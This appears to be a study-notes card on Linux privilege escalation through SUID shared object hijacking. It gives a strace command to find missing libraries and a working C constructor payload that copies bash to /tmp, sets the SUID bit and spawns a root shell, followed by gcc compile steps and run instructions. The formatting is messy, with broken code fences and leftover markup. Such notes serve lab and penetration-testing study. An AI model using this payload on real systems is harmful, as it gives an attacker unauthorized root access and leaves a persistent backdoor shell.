---
title: SUID Shared Object Hijacking
category: linux-privilege-escalation
tags: [ks-import, suid, shared-object, rpath, gcc, privilege-escalation]
source: linux prev fundd/linux prev 3.md
sourceId: 10015
---
📂 STREAMLINED OBSIDIAN VAULT ENTRY

Copy this high-density reference card into your vault:

Title: Linux PrivEsc - SUID Shared Object (.so) Hijacking
Tags: #Linux #PrivEsc #SUID #SharedObject #Strace #GCC #RPATH
> 
> ```
>     Core Vulnerability: An SUID root binary attempts to load a shared library (.so) from a user-writable directory (due to misconfigured RPATH/RUNPATH) or tries to load a non-existent library.
> ```

    Discovery (Tracing Syscalls):

```
        strace [SUID_BINARY] 2>&1 | grep -iE "open|access|no such file"
```

        Look for failed openat() attempts in writable directories (/tmp, /home/*, /var/tmp).

> ```
>     Payload Construction (lib.c):
>     code C
> ```

```
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

Compilation: ==gcc -shared -fPIC -o /path/to/missing/lib.so lib.c==

> ```
```
==**8. Save the file as libcalc.c==**
**==9. In command prompt type:==**
**==gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c==**
**==10. In command prompt type: /usr/local/bin/suid-so==**
**==11. In command prompt type: id**==
```
